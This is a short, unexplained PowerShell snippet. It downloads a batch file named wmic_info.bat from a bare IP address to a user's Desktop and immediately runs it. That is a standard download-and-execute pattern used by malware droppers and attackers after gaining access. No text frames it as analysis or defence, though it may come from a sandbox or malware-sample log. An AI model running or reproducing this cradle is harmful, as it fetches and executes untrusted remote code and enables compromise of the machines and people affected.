$client = new-object System.Net.WebClient
$client.DownloadFile('http://106.55.255.189/wmic_info.bat', 'C:\Users\test\Desktop\wmic_info.bat')
start-process C:\Users\test\Desktop\wmic_info.bat